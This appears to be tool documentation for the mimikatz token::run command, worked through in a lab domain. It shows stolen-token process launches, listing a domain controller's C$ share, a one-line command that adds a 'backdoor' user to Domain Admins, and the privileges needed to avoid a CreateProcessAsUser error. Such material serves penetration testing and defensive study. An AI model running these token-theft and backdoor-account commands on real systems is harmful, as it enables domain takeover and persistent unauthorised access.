# run

`token::run` executes a new process with its token.

It has the following command line arguments:

* `/id`: Token id to use for the new process
* `/user`: Execute the process with the tokens of this user (instead of specifying the token ID)..
* `/process`: The process to run. By default, the command `whoami` is executed.

## Use Primary Token in new Process

List tokens of user to impersonate:

```
mimikatz # token::list /user:ffast
Token Id  : 0
User name : ffast
SID name  :
 
5332    {0;000563b2} 2 F 457263         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
4432    {0;000563b2} 2 F 2839551        winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
668     {0;00050574} 0 D 329079         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (12g,24p)       Impersonation (Impersonation)
668     {0;000563e4} 2 L 353269         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
800     {0;000563e4} 2 L 456098         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
920     {0;000563e4} 2 L 380750         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
920     {0;000563e4} 2 L 387116         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,01p)       Impersonation (Identification)
920     {0;000563e4} 2 L 436160         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
[...]
```

Run a command using a specified token by it's token ID. By default, the command `whoami` is executed:

```
mimikatz # token::run /id:457263
Token Id  : 457263
User name :
SID name  :

676     {0;000f0ac5} 3 F 457263         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
winattacklab\ffast
```

## user

Run a command using a specified token by it's username. The domain name must not be specified. By default, the command `whoami` is executed:

```
mimikatz # token::run /user:ffast
Token Id  : 457263
User name :
SID name  :

676     {0;000f0ac5} 3 F 457263         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
winattacklab\ffast
```

## process

Other processes to spawn can be specified.

Example to access DC system drive:

```
mimikatz # token::run /id:1075487 /process:"cmd.exe /c dir \\dc1\c$"
Token Id  : 1075487
User name :
SID name  :

7156    {0;000f0ac5} 3 F 1075487        winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)
Primary
 Volume in drive \\dc1\c$ is Windows
 Volume Serial Number is 6A6C-0DE3

 Directory of \\dc1\c$

05/31/2023  06:30 AM    <DIR>          AzureData
05/31/2023  07:09 AM    <DIR>          ddns_server
05/31/2023  07:04 AM    <DIR>          inetpub
05/31/2023  06:46 AM    <DIR>          Packages
05/05/2023  11:31 AM    <DIR>          PerfLogs
05/31/2023  07:04 AM    <DIR>          Program Files
05/05/2023  12:26 PM    <DIR>          Program Files (x86)
05/31/2023  07:10 AM    <DIR>          terraform
05/31/2023  07:06 AM    <DIR>          Users
05/31/2023  07:05 AM    <DIR>          Windows
05/31/2023  06:33 AM    <DIR>          WindowsAzure
05/31/2023  07:07 AM    <DIR>          WSUS
               0 File(s)              0 bytes
              12 Dir(s)  15,918,473,216 bytes free
```

Add backdoor user:

```
mimikatz # token::run /id:1075487 /process:"cmd.exe /c net user backdoor Password.123 /add /domain && net group \"Domain Admins\" backdoor /add /domain && net user backdoor /domain"
Token Id  : 1075487
User name :
SID name  :

7156    {0;000f0ac5} 3 F 1075487        winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
The request will be processed at a domain controller for domain winattacklab.local.

The command completed successfully.

The request will be processed at a domain controller for domain winattacklab.local.

The command completed successfully.

The request will be processed at a domain controller for domain winattacklab.local.

User name                    backdoor
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/20/2023 3:59:27 PM
Password expires             Never
Password changeable          6/20/2023 3:59:27 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
```

## Demystifying the `kull_m_process_run_data` Error

Even as a local administrator, you can get the `kull_m_process_run_data` error:

```
mimikatz # token::run /id:1075487 /process:whoami.exe
Token Id  : 1075487
User name :
SID name  :

7156    {0;000f0ac5} 3 F 1075487        winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
ERROR kull_m_process_run_data ; CreateProcessAsUser (0x00000522)
```

- The error message says that the `CreateProcessAsUser` function could not be executed.

The `token::run` command uses the function `CreateProceasAsUser` to create a
new process in the security context of the specified token and requires the
following privileges (source: [CreateProcessAsUserA function (processthreadsapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera)):

- `SeIncreaseQuotaPrivilege` privilege
- `SeAssignPrimaryTokenPrivilege` privilege (if the token is not assignable)

A local admin has the permission to get the `SeIncreaseQuotaPrivilege` privilege but not the `SeAssignPrimaryTokenPrivilege` privilege:

```
mimikatz # privilege::name SeIncreaseQuotaPrivilege
Privilege '5' OK

mimikatz # privilege::name SeAssignPrimaryTokenPrivilege
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (3) c0000061
```

If you start mimikatz as `SYSTEM`, these privileges can be acquired:

```
mimikatz # privilege::name SeIncreaseQuotaPrivilege
Privilege '5' OK

mimikatz # privilege::name SeAssignPrimaryTokenPrivilege
Privilege '3' OK
```

Then, it's possible to use the `token::run` command and use stolen tokens as primary tokens.
